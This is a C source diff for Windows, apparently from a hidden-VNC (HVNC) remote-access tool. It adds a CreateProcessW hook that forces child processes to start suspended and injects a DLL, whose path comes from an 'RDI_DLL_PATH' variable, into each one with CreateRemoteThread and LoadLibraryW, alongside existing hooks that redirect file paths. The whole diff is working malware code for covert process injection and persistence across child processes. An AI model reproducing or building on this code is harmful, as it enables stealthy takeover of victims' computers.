@@ -287,6 +287,21 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
     pNtQueryDirectoryFile OriginalNtQueryDirectoryFile = NULL;
     pNtQueryDirectoryFileEx OriginalNtQueryDirectoryFileEx = NULL;
 
+    typedef BOOL(WINAPI* pCreateProcessW)(
+        LPCWSTR lpApplicationName,
+        LPWSTR lpCommandLine,
+        LPSECURITY_ATTRIBUTES lpProcessAttributes,
+        LPSECURITY_ATTRIBUTES lpThreadAttributes,
+        BOOL bInheritHandles,
+        DWORD dwCreationFlags,
+        LPVOID lpEnvironment,
+        LPCWSTR lpCurrentDirectory,
+        LPSTARTUPINFOW lpStartupInfo,
+        LPPROCESS_INFORMATION lpProcessInformation
+        );
+    pCreateProcessW OriginalCreateProcessW = NULL;
+    static WCHAR g_DllPath[512] = { 0 };
+
     // Helper function to check if path needs redirection
     BOOL NeedsRedirection(const WCHAR* path, SIZE_T length) {
         if (!path || length == 0) return FALSE;
@@ -698,6 +713,83 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             QueryFlags, FileName);
     }
 
+    // Inject the DLL into a child process via LoadLibraryW
+    static BOOL InjectDllIntoChild(HANDLE hProcess, const WCHAR* dllPath) {
+        SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
+
+        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!remoteMem) return FALSE;
+
+        SIZE_T written;
+        if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, &written)) {
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            return FALSE;
+        }
+
+        HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
+        if (!k32) {
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            return FALSE;
+        }
+
+        FARPROC pLoadLib = GetProcAddress(k32, "LoadLibraryW");
+        if (!pLoadLib) {
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            return FALSE;
+        }
+
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+            (LPTHREAD_START_ROUTINE)pLoadLib, remoteMem, 0, NULL);
+        if (!hThread) {
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            return FALSE;
+        }
+
+        WaitForSingleObject(hThread, 10000);
+        CloseHandle(hThread);
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+        return TRUE;
+    }
+
+    BOOL WINAPI HookedCreateProcessW(
+        LPCWSTR lpApplicationName,
+        LPWSTR lpCommandLine,
+        LPSECURITY_ATTRIBUTES lpProcessAttributes,
+        LPSECURITY_ATTRIBUTES lpThreadAttributes,
+        BOOL bInheritHandles,
+        DWORD dwCreationFlags,
+        LPVOID lpEnvironment,
+        LPCWSTR lpCurrentDirectory,
+        LPSTARTUPINFOW lpStartupInfo,
+        LPPROCESS_INFORMATION lpProcessInformation
+    ) {
+        BOOL wasSuspended = (dwCreationFlags & CREATE_SUSPENDED) != 0;
+        DWORD modifiedFlags = dwCreationFlags | CREATE_SUSPENDED;
+
+        BOOL result = OriginalCreateProcessW(
+            lpApplicationName, lpCommandLine,
+            lpProcessAttributes, lpThreadAttributes,
+            bInheritHandles, modifiedFlags,
+            lpEnvironment, lpCurrentDirectory,
+            lpStartupInfo, lpProcessInformation
+        );
+
+        if (result && lpProcessInformation && g_DllPath[0] != L'\0') {
+            LogDebug(L"[CreateProcessW] Injecting DLL into child process");
+            if (!InjectDllIntoChild(lpProcessInformation->hProcess, g_DllPath)) {
+                LogDebug(L"[CreateProcessW] Child injection failed");
+            } else {
+                LogDebug(L"[CreateProcessW] Child injection succeeded");
+            }
+
+            if (!wasSuspended) {
+                ResumeThread(lpProcessInformation->hThread);
+            }
+        }
+
+        return result;
+    }
+
     // Install all hooks
     void InstallNtApiHooks(LPVOID lpParameter) {
         // Use a global try-catch to prevent any crashes
@@ -723,6 +815,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             // Initialize to empty strings to prevent crashes
             g_SearchString[0] = L'\0';
             g_ReplacementString[0] = L'\0';
+            g_DllPath[0] = L'\0';
 
             // Try to get configuration from environment variables
             __try {
@@ -754,6 +847,18 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 else {
                     if (g_LogFile != INVALID_HANDLE_VALUE) {
                         LogDebugA("Environment variables not found, hooks disabled");
+                    }
+                }
+
+                // Read DLL path for child process injection
+                WCHAR envDllPath[512] = { 0 };
+                DWORD dllPathLen = GetEnvironmentVariableW(L"RDI_DLL_PATH", envDllPath, 512);
+                if (dllPathLen > 0 && dllPathLen < 512) {
+                    wcsncpy_s(g_DllPath, 512, envDllPath, dllPathLen);
+                    g_DllPath[dllPathLen] = L'\0';
+                    if (g_LogFile != INVALID_HANDLE_VALUE) {
+                        LogDebug(L"[ENV] DLL path for child injection: ");
+                        LogDebug(g_DllPath);
                     }
                 }
             }
@@ -849,6 +954,16 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 MH_CreateHook(pNtQueryDirectoryFileEx, &HookedNtQueryDirectoryFileEx, (LPVOID*)&OriginalNtQueryDirectoryFileEx);
                 MH_EnableHook(pNtQueryDirectoryFileEx);
                 if (g_LogFile != INVALID_HANDLE_VALUE) LogDebugA("Hooked NtQueryDirectoryFileEx");
+            }
+
+            HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
+            if (k32) {
+                FARPROC pCreateProcessW = GetProcAddress(k32, "CreateProcessW");
+                if (pCreateProcessW) {
+                    MH_CreateHook(pCreateProcessW, &HookedCreateProcessW, (LPVOID*)&OriginalCreateProcessW);
+                    MH_EnableHook(pCreateProcessW);
+                    if (g_LogFile != INVALID_HANDLE_VALUE) LogDebugA("Hooked CreateProcessW");
+                }
             }
 
             g_HooksInitialized = TRUE;
